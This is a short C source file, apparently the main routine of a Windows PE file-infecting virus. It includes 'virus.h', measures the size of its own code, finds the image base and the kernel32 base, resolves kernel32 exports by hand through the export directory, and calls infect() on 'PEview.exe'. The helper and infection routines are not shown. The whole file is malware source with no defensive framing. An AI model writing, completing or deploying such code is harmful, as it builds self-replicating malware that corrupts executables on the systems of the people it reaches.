#include "virus.h"


void start_code(void) {}

int run(void) {
  data_t data;
  IMAGE_NT_HEADERS *ntHdr = NULL;

  data.codeSize = end_code - start_code;

  printf("current code size: %.2f kB\n", (float)(data.codeSize)/ 1000);

  data.imageBase = get_image_base();
  data.kernel32Base = get_kernel32_base();

  if (!VERIFY_MZ(data.imageBase))
    return 1;

  if (!VERIFY_MZ(data.kernel32Base))
    return 2;

  ntHdr = get_nt_header(data.kernel32Base);

  IMAGE_EXPORT_DIRECTORY *exportDir = get_export_directory(data.kernel32Base, ntHdr);
  //printf("module name: %s\n", (uint8_t*)data.kernel32Base + exportDir->Name);

  if(fill_addresses(exportDir, data.kernel32Base, &data.functions) != sizeof(functions_t) / 4) {
    return 3;
  }
  return infect("PEview.exe", &data);
}
